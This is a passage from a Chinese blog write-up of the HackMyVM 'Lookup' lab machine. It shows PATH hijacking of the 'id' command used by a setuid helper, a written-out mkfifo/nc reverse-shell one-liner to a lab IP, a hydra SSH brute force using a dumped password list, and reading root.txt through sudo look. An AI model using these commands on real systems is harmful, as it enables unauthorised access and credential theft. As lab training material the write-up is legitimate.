class="string">__libc_csu_fini</span></span><br><span class="line"><span class="string">putchar@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_ITM_deregisterTMCloneTable</span></span><br><span class="line"><span class="string">__isoc99_fscanf@@GLIBC_2.7</span></span><br><span class="line"><span class="string">puts@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_edata</span></span><br><span class="line"><span class="string">fclose@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__stack_chk_fail@@GLIBC_2.4</span></span><br><span class="line"><span class="string">pclose@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">snprintf@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">fgetc@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__libc_start_main@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__data_start</span></span><br><span class="line"><span class="string">__gmon_start__</span></span><br><span class="line"><span class="string">__dso_handle</span></span><br><span class="line"><span class="string">_IO_stdin_used</span></span><br><span class="line"><span class="string">__libc_csu_init</span></span><br><span class="line"><span class="string">__bss_start</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">popen@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">fopen@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">perror@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__TMC_END__</span></span><br><span class="line"><span class="string">_ITM_registerTMCloneTable</span></span><br><span class="line"><span class="string">__cxa_finalize@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.interp</span></span><br><span class="line"><span class="string">.note.gnu.property</span></span><br><span class="line"><span class="string">.note.gnu.build-id</span></span><br><span class="line"><span class="string">.note.ABI-tag</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.gnu.version</span></span><br><span class="line"><span class="string">.gnu.version_r</span></span><br><span class="line"><span class="string">.rela.dyn</span></span><br><span class="line"><span class="string">.rela.plt</span></span><br><span class="line"><span class="string">.init</span></span><br><span class="line"><span class="string">.plt.got</span></span><br><span class="line"><span class="string">.plt.sec</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.fini</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame_hdr</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.init_array</span></span><br><span class="line"><span class="string">.fini_array</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.bss</span></span><br><span class="line"><span class="string">.comment</span></span><br><span class="line"><span class="string">www-data@lookup:/$ /usr/sbin/pwm</span></span><br><span class="line"><span class="string">/usr/sbin/pwm</span></span><br><span class="line"><span class="string">[!] Running &#x27;id&#x27; command to extract the username and user ID (UID)</span></span><br><span class="line"><span class="string">[!] ID: www-data</span></span><br><span class="line"><span class="string">[-] File /home/www-data/.passwords not found</span></span><br><span class="line"><span class="string">www-data@lookup:/$ </span></span><br></pre></td></tr></table></figure>

<p>看样子是对用户目录下的.passwords做某种操作，于是去home下看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/home$ <span class="built_in">cd</span> think</span><br><span class="line"><span class="built_in">cd</span> think/</span><br><span class="line">www-data@lookup:/home/think$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 5 think think 4096 Jan 11  2024 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout</span><br><span class="line">-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc</span><br><span class="line">drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache</span><br><span class="line">drwx------ 3 think think 4096 Aug  9  2023 .gnupg</span><br><span class="line">-rw-r----- 1 root  think  525 Jul 30  2023 .passwords</span><br><span class="line">-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile</span><br><span class="line">drw-r----- 2 think think 4096 Jun 21  2023 .ssh</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -&gt; /dev/null</span><br><span class="line">-rw-r----- 1 root  think   33 Jul 30  2023 user.txt</span><br></pre></td></tr></table></figure>

<p>没有阅读权限</p>
<p>劫持环境变量提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/home/think$ <span class="built_in">echo</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 4444 &gt;/tmp/f&quot;</span> &gt;/tmp/id  </span><br><span class="line">&lt;sh -i 2&gt;&amp;1|nc 192.168.56.102 1234 &gt;/tmp/f<span class="string">&quot; &gt;/tmp/id</span></span><br><span class="line"><span class="string">www-data@lookup:/home/think$ chmod +x /tmp/id</span></span><br><span class="line"><span class="string">chmod +x /tmp/id</span></span><br><span class="line"><span class="string">www-data@lookup:/home/think$ export PATH=/tmp:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">export PATH=/tmp:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="string">www-data@lookup:/home/think$ which id</span></span><br><span class="line"><span class="string">which id</span></span><br><span class="line"><span class="string">/tmp/id</span></span><br></pre></td></tr></table></figure>

<p>监听后运行pwn发现可以回弹一个终端，说明id生效了</p>
<p>那么可以考虑给id一个think</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218190727043.png" alt="image-20241218190727043"></p>
<p>这时候就完全可以劫持我们的think的id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/$ /usr/bin/id            </span><br><span class="line">/usr/bin/id</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@lookup:/$ /usr/bin/id think</span><br><span class="line">/usr/bin/id think</span><br><span class="line">uid=1000(think) gid=1000(think) <span class="built_in">groups</span>=1000(think)</span><br></pre></td></tr></table></figure>

<p>这时候我们只需要写入&#x2F;usr&#x2F;bin&#x2F;id think的结果并echo出来就可以伪造think的id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/$ <span class="built_in">echo</span> <span class="string">&#x27;echo &quot;uid=1000(think) gid=1000(think) groups=1000(think)&quot;&#x27;</span> &gt;/tmp/id             </span><br><span class="line">&lt;hink) gid=1000(think) <span class="built_in">groups</span>=1000(think)<span class="string">&quot;&#x27; &gt;/tmp/id</span></span><br><span class="line"><span class="string">www-data@lookup:/$ /usr/sbin/pwm</span></span><br><span class="line"><span class="string">/usr/sbin/pwm</span></span><br><span class="line"><span class="string">[!] Running &#x27;id&#x27; command to extract the username and user ID (UID)</span></span><br><span class="line"><span class="string">[!] ID: think</span></span><br><span class="line"><span class="string">jose1006</span></span><br><span class="line"><span class="string">jose1004</span></span><br><span class="line"><span class="string">jose1002</span></span><br><span class="line"><span class="string">jose1001teles</span></span><br><span class="line"><span class="string">jose100190</span></span><br><span class="line"><span class="string">jose10001</span></span><br><span class="line"><span class="string">jose10.asd</span></span><br><span class="line"><span class="string">jose10+</span></span><br><span class="line"><span class="string">jose0_07</span></span><br><span class="line"><span class="string">jose0990</span></span><br><span class="line"><span class="string">jose0986$</span></span><br><span class="line"><span class="string">jose098130443</span></span><br><span class="line"><span class="string">jose0981</span></span><br><span class="line"><span class="string">jose0924</span></span><br><span class="line"><span class="string">jose0923</span></span><br><span class="line"><span class="string">jose0921</span></span><br><span class="line"><span class="string">thepassword</span></span><br><span class="line"><span class="string">jose(1993)</span></span><br><span class="line"><span class="string">jose&#x27;sbabygurl</span></span><br><span class="line"><span class="string">jose&amp;vane</span></span><br><span class="line"><span class="string">jose&amp;takie</span></span><br><span class="line"><span class="string">jose&amp;samantha</span></span><br><span class="line"><span class="string">jose&amp;pam</span></span><br><span class="line"><span class="string">jose&amp;jlo</span></span><br><span class="line"><span class="string">jose&amp;jessica</span></span><br><span class="line"><span class="string">jose&amp;jessi</span></span><br><span class="line"><span class="string">josemario.AKA(think)</span></span><br><span class="line"><span class="string">jose.medina.</span></span><br><span class="line"><span class="string">jose.mar</span></span><br><span class="line"><span class="string">jose.luis.24.oct</span></span><br><span class="line"><span class="string">jose.line</span></span><br><span class="line"><span class="string">jose.leonardo100</span></span><br><span class="line"><span class="string">jose.leas.30</span></span><br><span class="line"><span class="string">jose.ivan</span></span><br><span class="line"><span class="string">jose.i22</span></span><br><span class="line"><span class="string">jose.hm</span></span><br><span class="line"><span class="string">jose.hater</span></span><br><span class="line"><span class="string">jose.fa</span></span><br><span class="line"><span class="string">jose.f</span></span><br><span class="line"><span class="string">jose.dont</span></span><br><span class="line"><span class="string">jose.d</span></span><br><span class="line"><span class="string">jose.com&#125;</span></span><br><span class="line"><span class="string">jose.com</span></span><br><span class="line"><span class="string">jose.chepe_06</span></span><br><span class="line"><span class="string">jose.a91</span></span><br><span class="line"><span class="string">jose.a</span></span><br><span class="line"><span class="string">jose.96.</span></span><br><span class="line"><span class="string">jose.9298</span></span><br><span class="line"><span class="string">jose.2856171</span></span><br><span class="line"><span class="string">www-data@lookup:/$ </span></span><br></pre></td></tr></table></figure>

<p>爆破ssh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># hydra -l think -P pass.txt ssh://192.168.56.101 -V -I</span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-18 06:14:37</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.56.101:22/</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose1006&quot;</span> - 1 of 49 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose1004&quot;</span> - 2 of 49 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose1002&quot;</span> - 3 of 49 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose1001teles&quot;</span> - 4 of 49 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose100190&quot;</span> - 5 of 49 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose10001&quot;</span> - 6 of 49 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose10.asd&quot;</span> - 7 of 49 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose10+&quot;</span> - 8 of 49 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0_07&quot;</span> - 9 of 49 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0990&quot;</span> - 10 of 49 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0986$&quot;</span> - 11 of 49 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose098130443&quot;</span> - 12 of 49 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0981&quot;</span> - 13 of 49 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0924&quot;</span> - 14 of 49 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0923&quot;</span> - 15 of 49 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose0921&quot;</span> - 16 of 49 [child 15] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;thepassword&quot;</span> - 17 of 52 [child 6] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose(1993)&quot;</span> - 18 of 52 [child 1] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&#x27;sbabygurl&quot;</span> - 19 of 52 [child 3] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;vane&quot;</span> - 20 of 52 [child 4] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;takie&quot;</span> - 21 of 52 [child 5] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;samantha&quot;</span> - 22 of 52 [child 9] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;pam&quot;</span> - 23 of 52 [child 2] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;jlo&quot;</span> - 24 of 52 [child 8] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;jessica&quot;</span> - 25 of 52 [child 15] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose&amp;jessi&quot;</span> - 26 of 52 [child 0] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;josemario.AKA(think)&quot;</span> - 27 of 52 [child 7] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose.medina.&quot;</span> - 28 of 52 [child 10] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.56.101 - login <span class="string">&quot;think&quot;</span> - pass <span class="string">&quot;jose.mar&quot;</span> - 29 of 52 [child 11] (0/3)</span><br><span class="line">[22][ssh] host: 192.168.56.101   login: think   password: josemario.AKA(think)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 3 final worker threads did not complete <span class="keyword">until</span> end.</span><br><span class="line">[ERROR] 3 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-18 06:14:42</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># ssh think@192.168.56.101          </span></span><br><span class="line">think@192.168.56.101<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Wed 18 Dec 2024 07:15:50 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.02              Processes:                210</span></span><br><span class="line"><span class="string">  Usage of /:   58.7% of 9.75GB   Users logged in:          0</span></span><br><span class="line"><span class="string">  Memory usage: 40%               IPv4 address for enp0s17: 192.168.56.101</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span></span><br><span class="line"><span class="string">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 updates can be applied immediately.</span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Jan 11 20:17:32 2024 from 192.168.1.13</span></span><br><span class="line"><span class="string">think@lookup:~$ id</span></span><br><span class="line"><span class="string">uid=1000(think) gid=1000(think) groups=1000(think)</span></span><br><span class="line"><span class="string">think@lookup:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">think@lookup:~$ cat user.txt </span></span><br><span class="line"><span class="string">38375fb4dd8baa2b2039ac03d92b820e</span></span><br></pre></td></tr></table></figure>

<p>sudo -l整出个look</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">think@lookup:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> think: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> think: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> think on lookup:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User think may run the following commands on lookup:</span><br><span class="line">    (ALL) /usr/bin/look</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218191955380.png" alt="image-20241218191955380"></p>
<p>直接看root.txt就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">think@lookup:~$ sudo look &#x27;&#x27; /root/root.txt</span><br><span class="line">5a285a9f257e45c68bb6c9f9f57d18e8</span><br></pre></td></tr></table></figure>

<p>或者读取id_rsa直接登录即可</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2024/12/18/HackMyVM%20Lookup/">https://xyaxxya.github.io/2024/12/18/HackMyVM%20Lookup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/look%E6%8F%90%E6%9D%83/">look提权</a><a class="post-meta__tags" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">环境变量劫持</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?2329" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/12/19/HackMyVM%20JO2024/" title="HackMyVM JO2024"><img class="cover" src="https://www.dmoe.cc/random.php?3123" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HackMyVM JO2024</div></div></a></div><div class="next-post pull-right"><a href="/2024/12/18/HackMyVM%20HackingToys/" title="HackMyVM HackingToys"><img class="cover" src="https://www.dmoe.cc/random.php?9652" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HackMyVM HackingToys</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/17/2-Lampiao/" title="2-Lampiao"><img class="cover" src="https://www.dmoe.cc/random.php?7300" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">2-Lampiao</div></div></a></div><div><a href="/2024/10/15/1-GoldenEye-v1/" title="1-GoldenEye-v1"><img class="cover" src="https://www.dmoe.cc/random.php?2222" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-15</div><div class="title">1-GoldenEye-v1</div></div></a></div><div><a href="/2024/11/29/5-w1r3s-v1-0/" title="5-w1r3s.v1.0"><img class="cover" src="https://www.dmoe.cc/random.php?6407" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-29</div><div class="title">5-w1r3s.v1.0</div></div></a></div><div><a href="/2024/09/05/AI-web%E9%9D%B6%E5%9C%BA/" title="AI-web靶场"><img class="cover" src="https://www.dmoe.cc/random.php?8038" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">AI-web靶场</div></div></a></div><div><a href="/2024/11/06/4-Tr0ll/" title="4-Tr0ll"><img class="cover" src="https://www.dmoe.cc/random.php?1758" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-06</div><div class="title">4-Tr0ll</div></div></a></div><div><a href="/2024/10/17/3-Raven2/" title="3-Raven2"><img class="cover" src="https://www.dmoe.cc/random.php?9597" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">3-Raven2</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab 